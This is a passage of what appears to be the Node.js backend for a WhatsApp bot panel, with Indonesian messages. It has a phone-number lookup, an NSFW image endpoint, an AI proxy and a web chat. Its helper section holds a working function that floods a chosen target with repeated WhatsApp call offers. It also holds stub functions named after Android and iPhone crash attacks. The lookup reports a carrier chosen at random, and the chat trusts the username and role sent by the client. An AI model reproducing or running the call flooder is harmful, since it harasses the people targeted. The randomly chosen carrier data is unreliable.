      '234': { name: 'Nigeria', code: 'NG', flag: '🇳🇬', carriers: ['MTN', 'Airtel', 'Glo'] },
      '52': { name: 'Mexico', code: 'MX', flag: '🇲🇽', carriers: ['Telcel', 'AT&T'] },
      '90': { name: 'Turkey', code: 'TR', flag: '🇹🇷', carriers: ['Turkcell', 'Vodafone'] }
    };
    let matched = null, matchedCode = null;
    const sorted = Object.keys(countryMap).sort((a, b) => b.length - a.length);
    for (const c of sorted) if (raw.startsWith(c)) { matched = countryMap[c]; matchedCode = c; break; }
    const local = matchedCode ? raw.substring(matchedCode.length) : raw;
    const isMobile = local.length >= 8 && local.length <= 12;
    res.json({
      valid: true, original: req.query.number, cleaned: raw,
      formatted: matchedCode ? `+${matchedCode} ${local}` : `+${raw}`,
      country_code: matchedCode ? '+' + matchedCode : null,
      country_name: matched ? matched.name : 'Unknown',
      country_flag: matched ? matched.flag : null,
      local_number: local, number_length: raw.length,
      type: isMobile ? 'Mobile' : 'Landline',
      possible_carrier: matched ? matched.carriers[Math.floor(Math.random() * matched.carriers.length)] : null
    });
  } catch (err) {
    res.json({ valid: false, error: err.message });
  }
});

app.get('/api/nsfw/random', async (req, res) => {
  try {
    let imageUrl = null, source = null;
    try {
      const r = await axios.get('https://api.waifu.pics/nsfw/waifu', { timeout: 8000 });
      if (r.data?.url) { imageUrl = r.data.url; source = 'waifu.pics'; }
    } catch {}
    if (!imageUrl) {
      try {
        const r = await axios.get('https://nekos.life/api/v2/img/nsfw_neko', { timeout: 8000 });
        if (r.data?.url) { imageUrl = r.data.url; source = 'nekos.life'; }
      } catch {}
    }
    if (imageUrl) return res.json({ success: true, url: imageUrl, source });
    res.json({ success: false, error: 'All sources unavailable.' });
  } catch (err) {
    res.json({ success: false, error: err.message });
  }
});

app.post('/api/ai/pollinations', requireAuth, async (req, res) => {
  try {
    const { messages, system, temperature } = req.body;
    if (!messages || !Array.isArray(messages)) {
      return res.status(400).json({ success: false, error: "messages invalid" });
    }
    const last = messages.filter(m => m.role === 'user').pop();
    if (!last?.content) return res.status(400).json({ success: false, error: "no user message" });

    const url = `https://api.siputzx.my.id/api/ai/glm47flash?prompt==${encodeURIComponent(last.content)}&system=${encodeURIComponent(system || "Kamu adalah Indictive AI.")}&temperature=${temperature || 0.7}`;
    const r = await axios.get(url, { timeout: 30000 });
    const reply = r.data?.data?.response;
    if (!reply) return res.status(500).json({ success: false, error: "AI kosong" });
    res.json({ success: true, reply });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// ==================== CHAT (Socket.IO) ==================== //
const CHAT_HISTORY_FILE = './chat-history.json';
const MAX_CHAT_HISTORY = 200;

function loadChatHistory() {
  if (!fs.existsSync(CHAT_HISTORY_FILE)) return [];
  try { return JSON.parse(fs.readFileSync(CHAT_HISTORY_FILE, 'utf-8')); } catch { return []; }
}
function saveChatHistory(h) {
  try { fs.writeFileSync(CHAT_HISTORY_FILE, JSON.stringify(h.slice(-MAX_CHAT_HISTORY), null, 2)); } catch {}
}

const connectedUsers = new Map();

io.on('connection', (socket) => {
  const username = socket.handshake.auth.username;
  const role = socket.handshake.auth.role;
  if (!username) { socket.disconnect(true); return; }

  connectedUsers.set(socket.id, { username, role });
  socket.emit('chat:history', loadChatHistory());

  function broadcastOnline() {
    const users = Array.from(connectedUsers.values());
    const seen = new Set(); const uniq = [];
    for (const u of users) if (!seen.has(u.username)) { seen.add(u.username); uniq.push(u); }
    io.emit('chat:onlineUsers', { users: uniq, count: uniq.length });
  }

  socket.broadcast.emit('chat:userJoin', { username, onlineCount: connectedUsers.size });
  broadcastOnline();

  socket.on('chat:message', (data) => {
    const msg = {
      username: data.username || username,
      role: data.role || role,
      message: (data.message || '').slice(0, 2000),
      timestamp: Date.now()
    };
    const h = loadChatHistory(); h.push(msg); saveChatHistory(h);
    io.emit('chat:newMessage', msg);
  });

  socket.on('chat:image', (data) => {
    const msg = {
      username: data.username || username,
      role: data.role || role,
      message: (data.message || '').slice(0, 500),
      image: data.image ? data.image.slice(0, 5000000) : null,
      filename: (data.filename || 'image').slice(0, 100),
      timestamp: Date.now()
    };
    const h = loadChatHistory(); h.push(msg); saveChatHistory(h);
    io.emit('chat:image', msg);
  });

  socket.on('chat:typing', (isTyping) => {
    socket.broadcast.emit('chat:userTyping', { username, isTyping: !!isTyping });
  });

  socket.on('ping', () => socket.emit('pong'));

  socket.on('disconnect', () => {
    connectedUsers.delete(socket.id);
    socket.broadcast.emit('chat:userLeave', { username, onlineCount: connectedUsers.size });
    broadcastOnline();
  });
});

// ==================== HELPER FUNCTIONS ==================== //
async function sendMessageNormal(sock, target, text) {
  try {
    await sock.relayMessage(target, { conversation: text || "Halo!" }, {
      messageId: sock.generateMessageTag()
    });
  } catch (err) {
    console.error("Gagal kirim:", err.message);
  }
}

async function spamCallFunction(sock, targetJid, isVideo, count) {
  let success = 0, failed = 0;
  for (let i = 0; i < count; i++) {
    try {
      const callId = crypto.randomBytes(8).toString('hex').toUpperCase();
      const stanza = {
        tag: 'iq',
        attrs: {
          to: targetJid, type: 'set',
          id: `${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
          xmlns: 'w:m'
        },
        content: [{ tag: 'offer', attrs: { 'call-id': callId, type: isVideo ? 'video' : 'audio' } }]
      };
      if (typeof sock.sendNode === 'function') await sock.sendNode(stanza);
      else if (typeof sock.query === 'function') {
        await Promise.race([sock.query(stanza), new Promise(r => setTimeout(r, 5000))]);
      } else throw new Error('Socket tidak support sendNode');
      success++;
      if (i < count - 1) await sleep(3000);
    } catch (err) {
      failed++;
      console.error(`[SPAMCALL] ${i + 1}:`, err.message);
    }
  }
  return { success, failed, total: count };
}

async function androcrash(sock, target) { for (let i = 0; i < 1; i++) { await sleep(1000); await sendMessageNormal(sock, target); await sleep(1000); } }
async function Ipongcrash(sock, target) { for (let i = 0; i < 1; i++) { await sleep(1000); await sendMessageNormal(sock, target); await sleep(1000); } }
async function Iponginvis(sock, target) { for (let i = 0; i < 1; i++) { await sleep(1000); await sendMessageNormal(sock, target); await sleep(1000); } }
async function androdelay(sock, target) { for (let i = 0; i < 1; i++) { await sleep(1000); await sendMessageNormal(sock, target); await sleep(1000); } }

// ==================== START SERVER ==================== //
server.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Server aktif di port ${PORT}`);
  console.log(`🌐 CORS allowed origins: ${ALLOWED_ORIGINS.join(', ')} (semua *.netlify.app otomatis diizinkan)`);
});

// ==================== EXPORTS ==================== //
module.exports = {
  loadAkses, saveAkses, isOwner, isAuthorized,
  saveUsers, getUsers, VALID_USER_ROLES
};